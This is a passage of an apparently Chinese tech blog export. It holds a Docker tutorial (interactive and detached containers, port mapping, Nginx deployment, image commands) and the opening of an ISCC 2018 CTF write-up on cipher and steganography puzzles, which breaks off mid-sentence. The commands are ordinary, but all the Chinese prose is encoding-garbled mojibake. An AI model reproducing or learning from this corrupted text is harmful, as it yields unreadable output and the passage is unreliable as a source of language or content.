Win10ä¸Šæœ‰è™šæ‹Ÿæœºï¼Œå¼€äº†Dockerä¸¤è€…å°±ä¼šä¸å…¼å®¹ï¼Œå› ä¸ºDockerå¾—å¼€å¯win10è‡ªå¸¦çš„Hyper-Vè™šæ‹ŸåŒ–ï¼Œè·Ÿè™šæ‹Ÿæœºä¼šäº§ç”Ÿå†²çªï¼Œåç»­æ¯æ¬¡å¯åŠ¨å…³é—­éƒ½å¾—é‡å¯ï¼Œåˆ«é—®æˆ‘ä¸ºä»€ä¹ˆçŸ¥é“ã€‚ã€‚å› ä¸ºæˆ‘éƒ½è¯•è¿‡äº†ã€‚ã€‚-_-||</p><p>ä¸‹é¢çš„è¿‡ç¨‹æˆ‘å°±é»˜è®¤ç›´æ¥æ˜¯érootç”¨æˆ·ä½¿ç”¨dockeräº†</p><h3 id="Dockerä½¿ç”¨"><a href="#Dockerä½¿ç”¨" class="headerlink" title="Dockerä½¿ç”¨"></a>Dockerä½¿ç”¨</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run ubuntu <span class="built_in">echo</span> <span class="string">'hello'</span></span><br></pre></td></tr></table></figure><p>åœ¨è¾“å‡ºhello worldä¹‹åé•œåƒä¹Ÿå°±å…³é—­äº†ï¼Œæ— æ³•äº¤äº’<br>å¦‚æœæƒ³è¦äº¤äº’ç•Œé¢çš„è¯ï¼Œçœ‹ä¸‹é¢</p><h4 id="è¿è¡Œäº¤äº’å¼çš„å®¹å™¨"><a href="#è¿è¡Œäº¤äº’å¼çš„å®¹å™¨" class="headerlink" title="è¿è¡Œäº¤äº’å¼çš„å®¹å™¨"></a>è¿è¡Œäº¤äº’å¼çš„å®¹å™¨</h4><p>dockerçš„ä¸¤ä¸ªå‚æ•° <code>-i -t</code>ï¼Œè®©dockerè¿è¡Œçš„å®¹å™¨å®ç°<code>bashäº¤äº’</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â€¢ -t:åœ¨æ–°å®¹å™¨å†…æŒ‡å®šä¸€ä¸ªä¼ªç»ˆç«¯æˆ–ç»ˆç«¯ã€‚</span><br><span class="line">â€¢ -i:å…è®¸ä½ å¯¹å®¹å™¨å†…çš„æ ‡å‡†è¾“å…¥ (STDIN) è¿›è¡Œäº¤äº’</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run  -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>å‘½ä»¤<code>exit</code>å°±å¯ä»¥é€€å‡ºäº¤äº’å¼ç•Œé¢äº†ï¼Œå¹¶ä¸”æ˜¯<code>ç›´æ¥</code>æŠŠå®¹å™¨é€€å‡ºçš„</p><p>ç¡®è®¤å®¹å™¨æ˜¯å¦åœ¨è¿è¡Œï¼Œå¯ä»¥é€šè¿‡ <code>docker ps [-a] [-l]</code>æŸ¥çœ‹ï¼Œæ²¡æœ‰å‚æ•°é»˜è®¤æŸ¥çœ‹è¿è¡Œå®¹å™¨çš„è¿›ç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-a: all    å¯æŸ¥çœ‹è¿è¡Œè¿‡çš„å®¹å™¨</span><br><span class="line">-l: latest</span><br></pre></td></tr></table></figure><h4 id="åœæ­¢å®¹å™¨"><a href="#åœæ­¢å®¹å™¨" class="headerlink" title="åœæ­¢å®¹å™¨"></a>åœæ­¢å®¹å™¨</h4><p>æˆ‘ä»¬ä½¿ç”¨ <code>docker stop</code> å‘½ä»¤æ¥åœæ­¢å®¹å™¨:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop å®¹å™¨IDå·</span><br></pre></td></tr></table></figure><p>åœæ­¢ä¹‹åè®°å¾—<code>docker ps</code>ä¸€æ³¢æŸ¥çœ‹æ˜¯å¦çœŸæ­£å…³é—­</p><p>è‡ªå®šä¹‰å®¹å™¨åå­—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name è‡ªå®šä¹‰å -i  -t IMAGE /bin/bash</span><br></pre></td></tr></table></figure><p>åˆ é™¤åœæ­¢çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm å®¹å™¨å</span><br></pre></td></tr></table></figure><h4 id="é‡æ–°å¯åŠ¨åœæ­¢çš„å®¹å™¨"><a href="#é‡æ–°å¯åŠ¨åœæ­¢çš„å®¹å™¨" class="headerlink" title="é‡æ–°å¯åŠ¨åœæ­¢çš„å®¹å™¨"></a>é‡æ–°å¯åŠ¨åœæ­¢çš„å®¹å™¨</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start -i å®¹å™¨åæˆ–ID</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-iå‚æ•°æŒ‡çš„æ˜¯æ˜¯å¦è¦äº¤äº’ç•Œé¢</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æŸä¸ªå®¹å™¨æ›´åŠ è¯¦ç»†çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect å®¹å™¨å”¯ä¸€IDæˆ–åå­—</span><br></pre></td></tr></table></figure><h3 id="å¯åŠ¨å®¹å™¨-åå°æ¨¡å¼-å®ˆæŠ¤å¼å®¹å™¨"><a href="#å¯åŠ¨å®¹å™¨-åå°æ¨¡å¼-å®ˆæŠ¤å¼å®¹å™¨" class="headerlink" title="å¯åŠ¨å®¹å™¨(åå°æ¨¡å¼/å®ˆæŠ¤å¼å®¹å™¨)"></a>å¯åŠ¨å®¹å™¨(åå°æ¨¡å¼/å®ˆæŠ¤å¼å®¹å™¨)</h3><p>ä¸€èˆ¬ç”¨äºå¼€å¯æœåŠ¡ï¼Œæ²¡æœ‰ä¼šè¯ï¼Œé•¿æœŸè¿è¡Œ<br>æ€ä¹ˆç†è§£è¿™ä¸ªä¸œè¥¿ï¼Œçœ‹ä¸‹é¢</p><p>å°è¯•ä¸‹é¢çš„å‘½ä»¤ï¼Œç„¶ådocker pså‘ç°è¯¥å®¹å™¨ä»åœ¨åå°æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d ubuntu /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/30/C52ySs.png" alt="C52ySs.png"><br>æ­¤æ—¶æˆ‘ä»¬è¾“å…¥<code>docker logs å®¹å™¨ID</code><br>ä¼šæ˜¾ç¤ºå®¹å™¨å†…çš„æ ‡å‡†è¾“å‡º<br><img src="https://s1.ax1x.com/2018/05/30/C52wTS.png" alt="C52wTS.png"></p><p>ä¸€èˆ¬çš„è¯æˆ‘ä»¬åœ¨è¿è¡Œä¸€ä¸ªäº¤äº’å¼çš„bashçš„æ—¶å€™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -i  -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>ç”¨çš„æ˜¯ <code>ctrl+P</code>å’Œ <code>ctrl+Q</code>é”®å»é€€å‡ºè¿™æ ·å°±ä¼šåœ¨åå°ä¸€ç›´è¿è¡Œ</p><p>è¦æƒ³å›å»æ€ä¹ˆåŠï¼Ÿè¿ç”¨é™„åŠ å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach å®¹å™¨IDæˆ–è€…åå­—</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/C5Rk0f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/30/C5Rk0f.md.png" alt="C5Rk0f.md.png"></a></p><p>æˆ‘ä»¬è¿˜å¯ä»¥ç›´æ¥ç”¨-då‚æ•°å¯åŠ¨dockerå®¹å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d ubuntu [COMMAND][ARGâ€¦]  ä¹Ÿå°±æ˜¯è¿™éƒ¨åˆ†ä¸€å¼€å¤´çš„ä¾‹å­</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†æ¥è¯¦ç»†è®²ä¸‹<code>docker logs</code>å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs [-f][-t][--tail] å®¹å™¨ID/åå­—</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-få¯ä»¥ç†è§£ä¸ºæ˜¯åŠ¨æ€è¿½è¸ª</span><br><span class="line">-tæ˜¯æ˜¾ç¤ºæ—¶é—´ è¿˜æœ‰å…¶ä»–å‚æ•°å¯æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£</span><br></pre></td></tr></table></figure><p>  ä¸€èˆ¬æˆ‘éƒ½æ˜¯ä¸å¸¦å‚æ•°çš„ã€‚ã€‚ã€‚</p><h4 id="æŸ¥çœ‹å®¹å™¨å†…çš„è¿›ç¨‹"><a href="#æŸ¥çœ‹å®¹å™¨å†…çš„è¿›ç¨‹" class="headerlink" title="æŸ¥çœ‹å®¹å™¨å†…çš„è¿›ç¨‹"></a>æŸ¥çœ‹å®¹å™¨å†…çš„è¿›ç¨‹</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top å®¹å™¨ID/åå­—</span><br></pre></td></tr></table></figure><h4 id="åœ¨å®¹å™¨å†…æ‰§è¡Œæ–°çš„è¿›ç¨‹"><a href="#åœ¨å®¹å™¨å†…æ‰§è¡Œæ–°çš„è¿›ç¨‹" class="headerlink" title="åœ¨å®¹å™¨å†…æ‰§è¡Œæ–°çš„è¿›ç¨‹"></a>åœ¨å®¹å™¨å†…æ‰§è¡Œæ–°çš„è¿›ç¨‹</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> [-d] [-i] [-t] å®¹å™¨å [<span class="built_in">command</span>]</span><br></pre></td></tr></table></figure><h4 id="åœæ­¢å®ˆæŠ¤å¼å®¹å™¨çš„æ–¹æ³•"><a href="#åœæ­¢å®ˆæŠ¤å¼å®¹å™¨çš„æ–¹æ³•" class="headerlink" title="åœæ­¢å®ˆæŠ¤å¼å®¹å™¨çš„æ–¹æ³•"></a>åœæ­¢å®ˆæŠ¤å¼å®¹å™¨çš„æ–¹æ³•</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 docker stop å®¹å™¨ID/åå­—    </span><br><span class="line">2 docker <span class="built_in">kill</span> å®¹å™¨ID/åå­—</span><br></pre></td></tr></table></figure><p>åŒºåˆ«åœ¨äºç¬¬ä¸€ç§æ˜¯ç­‰å¾…å®¹å™¨å†…è¿›ç¨‹ç»“æŸå†å…³é—­ï¼Œå¦å¤–ä¸€ç§æ˜¯ç›´æ¥ç»“æŸå®¹å™¨</p><p>æƒ³äº†è§£æ›´å¤šä½¿ç”¨dockerå¸®åŠ©æ–‡æ¡£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> manå‘½ä»¤</span><br><span class="line">å¦‚</span><br><span class="line">man docker-run</span><br><span class="line">man docker-top</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Dockerä¸­éƒ¨ç½²é™æ€ç½‘é¡µ"><a href="#Dockerä¸­éƒ¨ç½²é™æ€ç½‘é¡µ" class="headerlink" title="Dockerä¸­éƒ¨ç½²é™æ€ç½‘é¡µ"></a>Dockerä¸­éƒ¨ç½²é™æ€ç½‘é¡µ</h3><h4 id="è®¾ç½®å®¹å™¨çš„ç«¯å£æ˜ å°„"><a href="#è®¾ç½®å®¹å™¨çš„ç«¯å£æ˜ å°„" class="headerlink" title="è®¾ç½®å®¹å™¨çš„ç«¯å£æ˜ å°„"></a>è®¾ç½®å®¹å™¨çš„ç«¯å£æ˜ å°„</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run   [-P][-p]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-P: å¯¹å®¹å™¨æ‰€æœ‰çš„ç«¯å£è¿›è¡Œæ˜ å°„</span><br><span class="line">-p: æŒ‡å®šæ˜ å°„å“ªäº›å®¹å™¨çš„ç«¯å£</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯å‡ ä¸ªä¾‹å­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">containerPort åªæŒ‡å®šå®¹å™¨çš„ç«¯å£ï¼Œå®¿ä¸»æœºçš„ç«¯å£éšæœºæ˜ å°„</span><br><span class="line">docker run -p 80 -i  -t /bin/bash</span><br><span class="line">hostPort:ContainerPort åŒæ—¶åˆ¶å®šå®¿ä¸»æœºç«¯å£ä»¥åŠå®¹å™¨ç«¯å£</span><br><span class="line"> docker run -p 8080:80 -i -t /bin/bash</span><br><span class="line"> ip:containerPort æŒ‡å®šipå’Œå®¹å™¨çš„ç«¯å£</span><br><span class="line"> docker run -p 0.0.0.0:80 -i -t /bin/bash</span><br><span class="line"> ip:hostPort:ContainerPort åŒæ—¶åˆ¶å®šipä»¥åŠå®¿ä¸»æœºç«¯å£ä»¥åŠå®¹å™¨ç«¯å£</span><br><span class="line"> docker run -p 0.0.0.0:8080:80 -i -t /bin/bash</span><br></pre></td></tr></table></figure><h4 id="Nginxéƒ¨ç½²æµç¨‹"><a href="#Nginxéƒ¨ç½²æµç¨‹" class="headerlink" title="Nginxéƒ¨ç½²æµç¨‹"></a>Nginxéƒ¨ç½²æµç¨‹</h4><p>å…ˆè¿è¡Œä¸€ä¸ªå¸¦ç«¯å£æ˜ å°„çš„å®¹å™¨å¹¶å‘½åä¸ºweb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80 --name web -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>ç„¶åå®‰è£…Nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y nginx</span><br></pre></td></tr></table></figure><p>å®‰è£…Vimç¼–è¾‘å™¨ ï¼Œä¸»è¦æ˜¯ä¸ºäº†æ–¹ä¾¿ä¿®æ”¹ä¸œè¥¿</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y vim</span><br></pre></td></tr></table></figure><p>æ–°å»ºä¸€ä¸ªå·¥ä½œç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /var/www/html</span><br></pre></td></tr></table></figure><p>åˆ‡æ¢åˆ°å·¥ä½œç›®å½•ä¸‹,ç¼–è¾‘ä¸€ä¸ªé™æ€é¡µé¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">cd</span> /var/www/html</span><br><span class="line">vim index.html</span><br></pre></td></tr></table></figure><p>è‡ªå·±å–œæ¬¢å†™ç‚¹å•¥å°±å†™å•¥å§</p><p>æŸ¥æ‰¾ä¸€ä¸‹Nginxæ–‡ä»¶çš„ä½ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis nginx</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹etcä¸‹é¢çš„Nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/nginx</span><br></pre></td></tr></table></figure><p>è¿›å»é‡Œé¢çš„sites-enabledç›®å½•é‡Œé¢ï¼Œå‘ç°ä¸€ä¸ªdefaultæ–‡ä»¶æ‰“å¼€ç¼–è¾‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/nginx/sites-enabled</span><br><span class="line"> vim default</span><br></pre></td></tr></table></figure><p>æ”¹å˜rootçš„å€¼ä¸ºä½ çš„ç½‘é¡µç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root: /var/www/html</span><br></pre></td></tr></table></figure><p>å¼€å§‹è¿è¡Œnginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure><p> <code>ps -ef</code> æŸ¥çœ‹ç›¸å…³è¿›ç¨‹æ˜¯å¦å¯åŠ¨</p><p>è®©å®ƒç»§ç»­åå°è¿è¡Œ<br>å¯ä»¥ç”¨ä¸‹é¢å‡ ä¸ªå‘½ä»¤æŸ¥çœ‹ç«¯å£å·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps </span><br><span class="line">docker port å®¹å™¨ID/åå­—</span><br><span class="line">docker top å®¹å™¨ID/åå­—</span><br></pre></td></tr></table></figure><p>ç„¶åå†curlä¸€æ³¢å°±çŸ¥é“ï¼Œæ˜¯å¦å®‰è£…æˆåŠŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1:32770</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æœ¬æœºçš„æµè§ˆå™¨é‡Œé¢æ‰“å¼€ã€‚ã€‚</p><p>è¿˜å¯ä»¥ç”¨å®¹å™¨çš„ipåœ°å€å»å®ç°åœ¨æœ¬æœºæµè§ˆå™¨çš„æµè§ˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect å®¹å™¨ID/åå­—</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å®¹å™¨ipåœ°å€å’Œæ˜ å°„ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â€œIPAddressâ€: â€œ172.17.0.2â€</span><br><span class="line">â€œHostPortâ€: â€œ32768â€</span><br></pre></td></tr></table></figure><p>è®¿é—®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.17.0.2</span><br></pre></td></tr></table></figure><p>è¿™å°±ä¸éœ€è¦æŒ‡å®šç«¯å£å·äº†ï¼Œç”¨é»˜è®¤çš„80ç«¯å£å°±å¯ä»¥è®¿é—®<br>åœæ­¢è¯¥å®¹å™¨ï¼Œç„¶åå†æ¬¡å¯åŠ¨</p><p>æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€æ—¦æˆ‘ä»¬å…³é—­å¹¶ä¸”é‡æ–°å¯åŠ¨çš„è¯ï¼Œdockeråˆ†é…çš„æ˜ å°„ipä»¥åŠç«¯å£åœ°å€éƒ½ä¼šæ”¹å˜ï¼Œéœ€è¦é‡æ–°æŸ¥çœ‹</p><p>é•œåƒæ ‡ç­¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TAG </span><br><span class="line"> ubuntu:latest</span><br><span class="line"> ubuntu:14.04</span><br></pre></td></tr></table></figure><p>å•¥éƒ½ä¸å†™é»˜è®¤<code>latest</code>æ ‡ç­¾</p><p>åˆ é™¤é•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi é•œåƒå:æ ‡ç­¾/ID</span><br></pre></td></tr></table></figure><p>æœç´¢é•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search</span><br></pre></td></tr></table></figure><p>æ‹‰å–é•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> docker pull ä½ æœåˆ°çš„é•œåƒå</span><br><span class="line">docker pushå‘½ä»¤å¯ä»¥å°†æŸä¸€ä¸ªé•œåƒå‘å¸ƒåˆ°å®˜æ–¹ç½‘ç«™ã€‚</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨DockerFileæ„å»ºé•œåƒ ,è¿™ä¸ªä¸œè¥¿æœ‰æ—¶å€™è¿˜æ˜¯å¾ˆå¥½ç”¨çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t=<span class="string">'è‡ªå®šä¹‰åå­—'</span> DockerFile</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¯å¢ƒéƒ¨ç½² </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ISCC 2018åšé¢˜è®°å½•</title>
      <link href="/ISCC-2018-wp.html"/>
      <url>/ISCC-2018-wp.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ„Ÿè§‰è‡ªå·±å¥½èœï¼Œåªä¼šåšå‡ ä¸ªé¢˜ç›®ï¼Œè€Œä¸”æ‰“æ‰“åœåœï¼Œè¿˜è¦åº”ä»˜å„ç§è€ƒè¯•ï¼Œå¿™ä¸è¿‡æ¥ï¼Œä»¥åè¿˜æ˜¯è¦æ›´åŠ åŠªåŠ›å­¦ä¹ å•Šã€‚ã€‚è¿˜æ˜¯å…ˆè®°å½•ä¸€ä¸‹è‡ªå·±çš„åšé¢˜è¿‡ç¨‹ï¼Œæ…¢æ…¢è¿›æ­¥ï¼Œè·Ÿä¸ä¸Šå¤§ä½¬ä»¬çš„æ­¥ä¼å•Šemmmã€‚ã€‚<br><a id="more"></a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="What-is-thatï¼Ÿ"><a href="#What-is-thatï¼Ÿ" class="headerlink" title="What is thatï¼Ÿ"></a>What is thatï¼Ÿ</h3><p>ç›´æ¥æ”¹å›¾ç‰‡é«˜åº¦å°±å¥½<br><img src="https://s1.ax1x.com/2018/05/25/CfUge0.png" alt="CfUge0.png"><br>å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/05/25/CfURoT.png" alt="CfURoT.png"></p><h3 id="ç§˜å¯†ç”µæŠ¥"><a href="#ç§˜å¯†ç”µæŠ¥" class="headerlink" title="ç§˜å¯†ç”µæŠ¥"></a>ç§˜å¯†ç”µæŠ¥</h3><p>æ‰“å¼€æ–‡ä»¶å‘ç°æ˜¯ä¸€å †ABç«‹åˆ»æƒ³åˆ°æ˜¯åŸ¹æ ¹å¯†ç ï¼Œç›´æ¥åŸ¹æ ¹è§£å¯†å¾—åˆ°flagï¼Œæ³¨æ„æœ€åæäº¤çš„æ˜¯å¤§å†™</p><h3 id="é‡é‡è°å½±"><a href="#é‡é‡è°å½±" class="headerlink" title="é‡é‡è°å½±"></a>é‡é‡è°å½±</h3><p>å‘ç°ä¸€æ®µ<code>base64</code>ç¼–ç ã€‚ä¸æ–­base64è§£ç ï¼Œæ³¨æ„æœŸé—´è¿˜è¦URLç¼–ç ï¼Œè¿™å°±æœ‰ç‚¹éº»çƒ¦äº†ï¼Œå½“ä½ base64è§£ç ä¸è¡Œçš„æ—¶å€™ï¼Œå°è¯•ä¸€ä¸‹<code>AESè§£å¯†</code>ï¼Œè¿™é‡Œkeyä¸ºç©ºï¼Œè§£å¯†ç½‘å€ <a href="http://tool.oschina.net/encrypt/" target="_blank" rel="noopener">http://tool.oschina.net/encrypt/</a><br>å¾—åˆ°ä¸‹é¢çš„ä¸œè¥¿<br>ç­”æ¡ˆå°±æ˜¯åé¢è¿™å¥ä½†å·²åŠ å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¼½å¨‘é å‘è€…è‹¥å¥¢é¡›æ‚‰å‘é›†æ¢µææ¢µè’™å¤¢æ€¯å€’è€¶å“†èˆ¬ç©¶æœ‰æ —</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ç‚¹è„‘æ´äº†ï¼Œæˆ‘ä¹‹å‰ä¸çŸ¥é“æœ‰è¿™ç§ä¸œè¥¿ï¼Œå«<code>ä¸ä½›è®ºç¦…</code><br>è§£å¯†ç½‘å€ <a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a><br>è§£å¯†åå¾—åˆ°flag</p><h3 id="Where-is-the-FLAGï¼Ÿ"><a href="#Where-is-the-FLAGï¼Ÿ" class="headerlink" title="Where is the FLAGï¼Ÿ"></a>Where is the FLAGï¼Ÿ</h3><p>è¿™ä¸ªé¢˜ç›®ä¸€å¼€å§‹ç”¨HXDæ‰“å¼€å‘ç°é‡Œé¢å­˜åœ¨æŸæ¬¾è½¯ä»¶çš„æ–‡ä»¶å<br><img src="https://s1.ax1x.com/2018/05/25/CfUISJ.png" alt="CfUISJ.png"></p><p>äºæ˜¯ç«‹å³ä¸‹è½½ä½¿ç”¨è¯¥è½¯ä»¶æ‰“å¼€è¿™å¼ å›¾ç‰‡ï¼Œå‘ç°ä¸‹é¢æœ‰å¤šä¸ªå›¾å±‚ï¼Œæ˜¯ä¸€å¼ äºŒç»´ç ï¼Œç›´æ¥æ‹¼æ¥æ‰«æå³å¯<br><img src="https://s1.ax1x.com/2018/05/25/CfUol9.png" alt="CfUol9.png"></p><h3 id="ç§˜å¯†ç”µæŠ¥-1"><a href="#ç§˜å¯†ç”µæŠ¥-1" class="headerlink" title="ç§˜å¯†ç”µæŠ¥"></a>ç§˜å¯†ç”µæŠ¥</h3><p>ç›´æ¥åå…­è¿›åˆ¶è§£ç å³å¯</p><h3 id="å‡¯æ’’åä¸‰ä¸–"><a href="#å‡¯æ’’åä¸‰ä¸–" class="headerlink" title="å‡¯æ’’åä¸‰ä¸–"></a>å‡¯æ’’åä¸‰ä¸–</h3><p>æ ¹æ®é¢˜ç›®åº”è¯¥æ˜¯å‡¯æ’’å¯†ç ä½ç§»13ä½ä¹Ÿå°±æ˜¯rot13ï¼Œç„¶åå°±æ˜¯è„‘æ´é¢˜ç›®äº†ï¼Œé”®ç›˜å¯†ç ï¼Œæ¯ä¸€ä½éƒ½æ˜¯å¯¹åº”é”®ç›˜çš„ä¸‹ä¸€è¡Œï¼Œç›´æ¥å‡ºæ¥flag</p><h3 id="ä¸€åªçŒ«çš„å¿ƒæ€"><a href="#ä¸€åªçŒ«çš„å¿ƒæ€" class="headerlink" title="ä¸€åªçŒ«çš„å¿ƒæ€"></a>ä¸€åªçŒ«çš„å¿ƒæ€</h3><p>è¿™ä¸ªé¢˜ç›®ä¹Ÿå¾ˆå‰å®³ï¼Œæˆ‘å¼„äº†å¾ˆä¹…ï¼Œä½†æ˜¯é‡Œé¢ä¹Ÿæœ‰ä¸ä½›è®ºç¦…ã€‚ã€‚ã€‚ã€‚<br>å…ˆæ˜¯åœ¨HXDé‡Œé¢æ‰¾åˆ°äº†officeçš„è¸ªè¿¹ï¼Œäºæ˜¯æˆ‘æ‰‹åŠ¨æå–å‡ºæ¥ï¼Œå¯èƒ½åˆ«çš„å¤§ä½¬æœ‰æ›´å¥½çš„æ–¹æ³•<br><img src="https://s1.ax1x.com/2018/05/25/CfU7O1.png" alt="CfU7O1.png"><br>ç„¶åæ‰“å¼€<br><img src="https://s1.ax1x.com/2018/05/25/CfUqw6.png" alt="CfUqw6.png"><br>åˆæ˜¯ä¸ä½›è®ºç¦…ï¼Œå‡ºé¢˜äººæ˜¯æœ‰å¤šå–œæ¬¢ã€‚ã€‚ã€‚<br>è§£å‡ºæ¥å‘ç°æ˜¯ä¸€å †16è¿›åˆ¶ï¼Œæˆ¿é—´converteré‡Œé¢è§£ç <br>å¾—åˆ°ä¸€å 